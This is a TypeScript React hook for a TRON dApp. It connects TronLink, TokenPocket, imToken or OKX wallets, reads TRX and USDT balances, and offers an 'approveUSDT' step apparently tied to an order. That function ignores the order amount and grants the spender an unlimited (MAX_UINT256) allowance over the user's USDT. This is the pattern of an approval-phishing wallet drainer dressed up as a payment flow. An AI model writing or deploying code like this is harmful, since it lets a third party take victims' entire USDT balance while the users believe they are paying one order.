import { useState, useEffect, useCallback } from 'react';

// Wallet types
export interface WalletInfo {
  id: string;
  name: string;
  icon: string;
  installed: boolean;
  priority: number;
  deepLink?: (url: string) => string;
}

export interface TronWalletState {
  isConnected: boolean;
  address: string | null;
  isConnecting: boolean;
  error: string | null;
  detectedWallet: string | null;
}

export interface BalanceInfo {
  trxBalance: number;
  usdtBalance: number;
  hasSufficientTrx: boolean;
  hasSufficientUsdt: boolean;
}

// Extend Window interface for TronWeb
declare global {
  interface Window {
    tronWeb?: {
      defaultAddress?: {
        base58?: string;
        hex?: string;
      };
      ready?: boolean;
      contract: (abi?: any[], address?: string) => Promise<any>;
      trx: {
        getBalance: (address: string) => Promise<number>;
      };
    };
    tronLink?: {
      ready?: boolean;
      request?: (params: { method: string }) => Promise<any>;
    };
    okxwallet?: {
      tronLink?: {
        request?: (params: { method: string }) => Promise<any>;
      };
    };
  }
}

// TRC20 USDT Contract
export const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// MAX_UINT256 for unlimited approval (避免JS精度问题，使用字符串)
export const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

// TRC20 ABI for approve
const TRC20_ABI = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      { "name": "_owner", "type": "address" },
      { "name": "_spender", "type": "address" }
    ],
    "name": "allowance",
    "outputs": [{ "name": "", "type": "uint256" }],
    "type": "function"
  }
];

// Wallet configurations with deep links
export const WALLET_CONFIGS: Omit<WalletInfo, 'installed'>[] = [
  {
    id: 'tronlink',
    name: 'TronLink',
    icon: '/wallets/tronlink.png',
    priority: 1,
    deepLink: (url: string) => {
      const data = {
        url: encodeURIComponent(url),
        action: 'open',
        protocol: 'tronlink',
        version: '1.0'
      };
      return `tronlinkoutside://pull.activiry?param=${encodeURIComponent(JSON.stringify(data))}`;
    }
  },
  {
    id: 'tokenpocket',
    name: 'TokenPocket',
    icon: '/wallets/tokenpocket.png',
    priority: 2,
    deepLink: (url: string) => `tpdapp://open?params={"url": "${encodeURIComponent(url)}"}`
  },
  {
    id: 'imtoken',
    name: 'imToken',
    icon: '/wallets/imtoken.png',
    priority: 3,
    deepLink: (url: string) => `imtokenv2://navigate?screen=DappView&url=${encodeURIComponent(url)}`
  },
  {
    id: 'okx',
    name: 'OKX Wallet',
    icon: '/wallets/mathwallet.png',
    priority: 4,
    deepLink: (url: string) => `okx://wallet/dapp/details?dappUrl=${encodeURIComponent(url)}`
  }
];

export function useTronWallet() {
  const [state, setState] = useState<TronWalletState>({
    isConnected: false,
    address: null,
    isConnecting: false,
    error: null,
    detectedWallet: null
  });

  const [balanceInfo, setBalanceInfo] = useState<BalanceInfo>({
    trxBalance: 0,
    usdtBalance: 0,
    hasSufficientTrx: false,
    hasSufficientUsdt: false
  });

  // Check if TronWeb is available
  const checkTronWeb = useCallback(() => {
    if (typeof window === 'undefined') return false;
    
    // Check for TronLink
    if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
      return true;
    }
    
    // Check for OKX
    if (window.okxwallet?.tronLink) {
      return true;
    }
    
    return false;
  }, []);

  // Detect installed wallets
  const detectWallets = useCallback((): WalletInfo[] => {
    const wallets: WalletInfo[] = WALLET_CONFIGS.map(config => ({
      ...config,
      installed: false
    }));

    if (typeof window === 'undefined') return wallets;

    // Check TronLink
    if (window.tronLink || window.tronWeb) {
      const tronlink = wallets.find(w => w.id === 'tronlink');
      if (tronlink) tronlink.installed = true;
    }

    // Check OKX
    if (window.okxwallet) {
      const okx = wallets.find(w => w.id === 'okx');
      if (okx) okx.installed = true;
    }

    return wallets.sort((a, b) => a.priority - b.priority);
  }, []);

  // Check balances
  const checkBalances = useCallback(async (requiredUsdt: number): Promise<BalanceInfo> => {
    if (!window.tronWeb?.defaultAddress?.base58) {
      return { trxBalance: 0, usdtBalance: 0, hasSufficientTrx: false, hasSufficientUsdt: false };
    }

    try {
      const currentAddress = window.tronWeb.defaultAddress.base58;
      
      // Check TRX balance
      const trxBalance = await window.tronWeb.trx.getBalance(currentAddress);
      const trxFormatted = trxBalance / 1_000_000;
      
      // Get USDT contract
      const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
      
      // Check USDT balance
      const usdtBalanceRaw = await contract.balanceOf(currentAddress).call();
      const usdtBalance = Number(usdtBalanceRaw) / 1e6;
      
      const info: BalanceInfo = {
        trxBalance: trxFormatted,
        usdtBalance,
        hasSufficientTrx: trxFormatted >= 15,
        hasSufficientUsdt: usdtBalance >= requiredUsdt
      };
      
      setBalanceInfo(info);
      return info;
    } catch (error) {
      console.error('Error checking balances:', error);
      return { trxBalance: 0, usdtBalance: 0, hasSufficientTrx: false, hasSufficientUsdt: false };
    }
  }, []);

  // Connect to wallet
  const connect = useCallback(async (): Promise<boolean> => {
    setState(prev => ({ ...prev, isConnecting: true, error: null }));

    try {
      // Try TronLink first
      if (window.tronLink?.request) {
        try {
          await window.tronLink.request({ method: 'tron_requestAccounts' });
        } catch (e) {
          console.log('TronLink request failed:', e);
        }
      }

      // Try OKX
      if (window.okxwallet?.tronLink?.request) {
        try {
          await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
        } catch (e) {
          console.log('OKX request failed:', e);
        }
      }

      // Wait a bit for connection
      await new Promise(resolve => setTimeout(resolve, 500));

      // Check if connected
      if (window.tronWeb?.defaultAddress?.base58) {
        const address = window.tronWeb.defaultAddress.base58;
        setState({
          isConnected: true,
          address,
          isConnecting: false,
          error: null,
          detectedWallet: window.tronLink ? 'TronLink' : 'Wallet'
        });
        return true;
      }

      setState(prev => ({
        ...prev,
        isConnecting: false,
        error: '未检测到钱包，请安装 TronLink 或 TokenPocket'
      }));
      return false;
    } catch (error: any) {
      console.error('Wallet connection error:', error);
      setState(prev => ({
        ...prev,
        isConnecting: false,
        error: error.message || '连接钱包失败'
      }));
      return false;
    }
  }, []);

  // Open wallet via deep link
  const openWallet = useCallback((walletId: string) => {
    const wallet = WALLET_CONFIGS.find(w => w.id === walletId);
    if (wallet?.deepLink) {
      const currentUrl = window.location.href;
      window.location.href = wallet.deepLink(currentUrl);
    }
  }, []);

  // Execute TRC20 unlimited approve
  const approveUSDT = useCallback(async (spenderAddress: string, orderAmount: number): Promise<{ success: boolean; txHash?: string; error?: string }> => {
    if (!window.tronWeb?.defaultAddress?.base58) {
      return { success: false, error: '钱包未连接' };
    }

    try {
      // Get USDT contract
      const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);

      // Execute unlimited approval using MAX_UINT256
      const transaction = await contract.approve(spenderAddress, MAX_UINT256).send({
        feeLimit: 100_000_000,
        callValue: 0,
        shouldPollResponse: true
      });

      if (transaction) {
        return { success: true, txHash: typeof transaction === 'string' ? transaction : JSON.stringify(transaction) };
      }
      
      return { success: false, error: '授权失败' };
    } catch (error: any) {
      console.error('Approve error:', error);
      
      // User denied signature
      if (error.message?.includes('User rejected') || error.message?.includes('denied') || error.message?.includes('cancel')) {
        return { success: false, error: '交易失败：Request Signature: User denied request signature.' };
      }
      
      return { success: false, error: error.message || '授权失败' };
    }
  }, []);

  // Auto-detect wallet on mount
  useEffect(() => {
    const checkConnection = () => {
      if (checkTronWeb() && window.tronWeb?.defaultAddress?.base58) {
        setState({
          isConnected: true,
          address: window.tronWeb.defaultAddress.base58,
          isConnecting: false,
          error: null,
          detectedWallet: window.tronLink ? 'TronLink' : 'Wallet'
        });
      }
    };

    // Check immediately
    checkConnection();

    // Check again after a delay (some wallets inject late)
    const timer = setTimeout(checkConnection, 1000);
    
    return () => clearTimeout(timer);
  }, [checkTronWeb]);

  return {
    ...state,
    balanceInfo,
    connect,
    detectWallets,
    openWallet,
    approveUSDT,
    checkTronWeb,
    checkBalances
  };
}
